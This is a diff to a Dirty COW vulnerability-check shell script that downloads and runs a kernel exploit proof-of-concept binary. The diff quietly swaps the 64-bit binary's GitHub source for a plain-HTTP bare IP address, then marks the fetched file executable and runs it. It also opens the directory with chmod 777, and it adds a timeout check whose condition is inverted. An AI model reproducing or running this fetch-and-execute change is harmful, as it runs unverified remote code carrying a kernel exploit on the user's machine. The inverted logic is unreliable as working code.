@@ -13,7 +13,7 @@ cd $path
 echo "Downloading POC...."
 
 if [ "$arch" = "x86_64" ];then
-	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/bin/pokemon.64' -O poc.bin
+	wget -q 'http://139.129.11.227/pokemon.64' -O poc.bin
 else
 	wget -q 'https://raw.githubusercontent.com/kings-way/dirtycow/master/bin/pokemon.32' -O poc.bin
 fi
@@ -23,12 +23,15 @@ chmod -R 777 $path
 chmod 0404 text_file
 chmod a+x poc.bin
 echo "Running the POC...."
-
-#timeout 3 /tmp/dirty_cow_check/poc.bin text_file "BBBB" >> /dev/null 2>>/dev/null
-timeout 3 /tmp/dirty_cow_check/poc.bin text_file "BBBB"
 set +e
-killall poc.bin >>/dev/null 2>>/dev/null
-set -e
+
+if [ ! -x "/usr/bin/timeout" ];then
+	timeout 3 /tmp/dirty_cow_check/poc.bin text_file "BBBB"
+else
+	/tmp/dirty_cow_check/poc.bin text_file "BBBB" &
+	sleep 3
+	killall poc.bin >>/dev/null 2>>/dev/null
+fi
 
 text=`cat $path/text_file`
 if [ "$text" = "AAAA" ];then
